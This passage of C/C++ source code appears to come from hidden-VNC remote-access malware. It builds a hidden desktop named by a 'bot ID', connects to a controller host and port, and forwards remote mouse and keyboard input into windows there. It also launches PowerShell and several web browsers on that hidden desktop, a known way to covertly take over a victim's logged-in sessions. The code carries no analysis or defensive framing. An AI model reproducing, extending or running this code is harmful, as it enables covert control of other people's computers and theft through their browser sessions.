			StartPowershell();
			break;
		}
		case ProStart::startChrome:
		{
			StartChrome();
			break;
		}
		case ProStart::startEdge:
		{
			StartEdge();
			break;
		}
		case ProStart::startBrave:
		{
			StartBrave();
			break;
		}

		case ProStart::startOpera:
		{
			StartOpera();
			break;
		}

		case ProStart::startFirefox:
		{
			StartFirefox();
			break;
		}
		case ProStart::startIexplore:
		{
			StartIe();
			break;
		}
		case WM_CHAR:
		case WM_KEYDOWN:
		case WM_KEYUP:
		{
			point = lastPoint;
			hWnd = WindowFromPoint(point);
			break;
		}
		default:
		{
			mouseMsg = TRUE;
			point.x = GET_X_LPARAM(lParam);
			point.y = GET_Y_LPARAM(lParam);
			lastPointCopy = lastPoint;
			lastPoint = point;

			hWnd =   WindowFromPoint(point);
			if (msg == WM_LBUTTONUP)
			{
				lmouseDown = FALSE;
				LRESULT lResult =   SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);

				switch (lResult)
				{
				case HTTRANSPARENT:
				{
					  SetWindowLongA(hWnd, GWL_STYLE,   GetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
					lResult =   SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
					break;
				}
				case HTCLOSE:
				{
					  PostMessageA(hWnd, WM_CLOSE, 0, 0);
					break;
				}
				case HTMINBUTTON:
				{
					  PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
					break;
				}
				case HTMAXBUTTON:
				{
					WINDOWPLACEMENT windowPlacement;
					windowPlacement.length = sizeof(windowPlacement);
					  GetWindowPlacement(hWnd, &windowPlacement);
					if (windowPlacement.flags & SW_SHOWMAXIMIZED)
						  PostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
					else
						  PostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
					break;
				}
				}
			}
			else if (msg == WM_LBUTTONDOWN)
			{
				lmouseDown = TRUE;
				hResMoveWindow = NULL;

				RECT startButtonRect;
				HWND hStartButton =   FindWindowA("Button", NULL);
				  GetWindowRect(hStartButton, &startButtonRect);
				if (  PtInRect(&startButtonRect, point))
				{
					  PostMessageA(hStartButton, BM_CLICK, 0, 0);
					continue;
				}
				else
				{
					char windowClass[MAX_PATH] = { 0 };
					  RealGetWindowClassA(hWnd, windowClass, MAX_PATH);

					if (!  lstrcmpA(windowClass, "#32768"))
					{
						HMENU hMenu = (HMENU)  SendMessageA(hWnd, MN_GETHMENU, 0, 0);
						int itemPos =   MenuItemFromPoint(NULL, hMenu, point);
						int itemId =   GetMenuItemID(hMenu, itemPos);
						  PostMessageA(hWnd, 0x1e5, itemPos, 0);
						  PostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
						continue;
					}
				}
			}
			else if (msg == WM_MOUSEMOVE)
			{
				if (!lmouseDown)
					continue;

				if (!hResMoveWindow)
					resMoveType =   SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
				else
					hWnd = hResMoveWindow;

				int moveX = lastPointCopy.x - point.x;
				int moveY = lastPointCopy.y - point.y;

				RECT rect;
				  GetWindowRect(hWnd, &rect);

				int x = rect.left;
				int y = rect.top;
				int width = rect.right - rect.left;
				int height = rect.bottom - rect.top;
				switch (resMoveType)
				{
				case HTCAPTION:
				{
					x -= moveX;
					y -= moveY;
					break;
				}
				case HTTOP:
				{
					y -= moveY;
					height += moveY;
					break;
				}
				case HTBOTTOM:
				{
					height -= moveY;
					break;
				}
				case HTLEFT:
				{
					x -= moveX;
					width += moveX;
					break;
				}
				case HTRIGHT:
				{
					width -= moveX;
					break;
				}
				case HTTOPLEFT:
				{
					y -= moveY;
					height += moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTTOPRIGHT:
				{
					y -= moveY;
					height += moveY;
					width -= moveX;
					break;
				}
				case HTBOTTOMLEFT:
				{
					height -= moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTBOTTOMRIGHT:
				{
					height -= moveY;
					width -= moveX;
					break;
				}
				default:
					continue;
				}
				  MoveWindow(hWnd, x, y, width, height, FALSE);
				hResMoveWindow = hWnd;
				continue;
			}
			break;
		}
		}

		for (HWND currHwnd = hWnd;;)
		{
			hWnd = currHwnd;
			  ScreenToClient(currHwnd, &point);
			currHwnd =   ChildWindowFromPoint(currHwnd, point);
			if (!currHwnd || currHwnd == hWnd)
				break;
		}

		if (mouseMsg)
			lParam = MAKELPARAM(point.x, point.y);

		  PostMessageA(hWnd, msg, wParam, lParam);
	}
exit:
	  TerminateThread(g_hDesktopThread, 0);
	return 0;
}

//typedef HDESK(WINAPI* T_CreateDesktop)(
//	PCHAR lpszDesktop,
//	PCHAR lpszDevice,
//	DEVMODE* pDevmode,
//	DWORD dwFlags,
//	ACCESS_MASK dwDesiredAccess,
//	LPSECURITY_ATTRIBUTES lpsa);
//
//typedef HDESK(WINAPI* T_OpenDesktop)(
//	PCHAR lpszDesktop,
//	DWORD dwFlags,
//	BOOL fInherit,
//	ACCESS_MASK dwDesiredAccess);





static DWORD WINAPI MainThread(LPVOID param)
{
	// Initialize the custom desktop name
	memset(g_desktopName, 0, sizeof(g_desktopName));
	GetBotId(g_desktopName);

	// Set up bitmap info
	memset(&g_bmpInfo, 0, sizeof(g_bmpInfo));
	g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
	g_bmpInfo.bmiHeader.biPlanes = 1;
	g_bmpInfo.bmiHeader.biBitCount = 24;
	g_bmpInfo.bmiHeader.biCompression = BI_RGB;
	g_bmpInfo.bmiHeader.biClrUsed = 0;

	// Open or create the custom desktop
	g_hDesk = OpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
	if (!g_hDesk) {
		g_hDesk = CreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
		if (!g_hDesk) {
			printf("Failed to create desktop. Error: %d\n", GetLastError());
			return 1;
		}
	}

	// Create a separate thread for the custom desktop
	g_hInputThread = CreateThread(NULL, 0, InputThread, NULL, 0, 0);
	if (!g_hInputThread) {
		printf("Failed to create input thread. Error: %d\n", GetLastError());
		return 1;
	}

	// Wait for the input thread to complete
	WaitForSingleObject(g_hInputThread, INFINITE);

	// Cleanup
	free(g_pixels);
	free(g_oldPixels);
	free(g_tempPixels);
	g_pixels = NULL;
	g_oldPixels = NULL;
	g_tempPixels = NULL;
	g_started = FALSE;

	CloseHandle(g_hInputThread);
	CloseHandle(g_hDesktopThread);
	CloseDesktop(g_hDesk);

	return 0;
}





HANDLE StartDesktop(const char* host, int port)
{
	if (g_started)
		return NULL;
	lstrcpyA(g_host, host);
	g_port = port;
	g_started = TRUE;
	return   CreateThread(NULL, 0, MainThread, NULL, 0, 0);
}
